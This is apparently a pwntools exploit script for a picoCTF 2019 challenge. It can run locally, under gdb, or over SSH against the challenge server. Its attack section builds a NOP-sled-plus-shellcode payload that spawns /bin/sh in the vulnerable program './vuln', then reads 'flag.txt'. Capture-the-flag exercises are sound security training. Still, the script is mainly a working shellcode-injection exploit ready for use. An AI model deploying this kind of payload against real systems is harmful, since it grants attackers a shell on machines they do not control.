#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

#=========================================================
#                   SETTING UP VARIABLES
#=========================================================

os ='linux'
arch ='i386'    
r_host = '2019shell1.picoctf.com'
r_dir = '/some/directory'
r_user = 'User'
r_passwd = 'Pa$$w0rd'
# r_port = ''                                            
exe = './vuln'
script = 'b* main'
local = False
remote = False
debug = False
mode = ''
s = ''
io = ''
data = ''
begin = ''
end = ''

                  # Context variables # 

context.log_level = 'debug'
context.update(os=os, arch=arch)

#==========================================================
#                   FUNCTION DEFINITIONS
#==========================================================

# Attaches gdb to the running process if 'debug' is selected
def attach_gdb():
    gdb.attach(io, gdbscript=script)

# Checks output for the 'pico' flag and either prints it or 
# exits if no data is sent.
def get_flag():
    global data
    global io

    data = io.recv(timeout=5)

    if not data:
        log.info('Something went wrong, no data received. Exiting... >_<')
        exit()

    if b'pico' in data:
        log.info(f"Pwned! Here's your flag: {data}")
    
    io.close()

#
#
def start():
    global local
    global remote
    global debug
    global begin
    global io
    global s
    global script
    
    i = 2

    begin = time.time()
    
    while i != 0:
      mode = input('Start exploit in local, remote or debug mode? ')
      if str('remote') in mode:
        remote = True
        break
      elif str('local') in mode:
        local = True
        break
      elif str('debug') in mode:
        debug = True
        break
      elif i == 0:
        log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
        exit()
      else:
        i -= 1
        log.info(f'Incorrect mode selected. Number of retries: {i}')
        
    if debug:
        io = process(exe)
        attach_gdb()
        log.info('Attaching gdb to running process')
        log.info(f'gdb script = {script}')
        log.info('Opening pwndbg...')

    elif remote:
        context.update(log_level = 'info')
        s = ssh(host=r_host, user=r_user, password=r_passwd)
        io = s.process(exe, cwd=r_dir)
        log.info('Remote variables set:')
        log.info(f'Remote host = {r_host}')
        log.info(f'Remote user = {r_user}')
        log.info(f'Changing working directory to: {r_dir} ')
        log.info('Starting remote exploit...')

    elif local:
        io = process(exe)
        log.info('Starting local exploit ...')

    else:
        log.info('Incorrect mode selected. Exiting...  >_< ')
        exit()  

def finish():
  global end
  
  end = time.time()
  run_time = end - begin
  io.close()
  print(f'Time elapsed: {run_time:.2f}')

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
start()

padding = b'\x90' * 256
shellcode = asm(shellcraft.sh())

payload = padding + shellcode

print(io.recv())

io.sendline(payload)

print(io.recv())

io.sendline(b'cat flag.txt')

get_flag()

finish()
#===========================================================
#                       END OF SCRIPT                      
#===========================================================

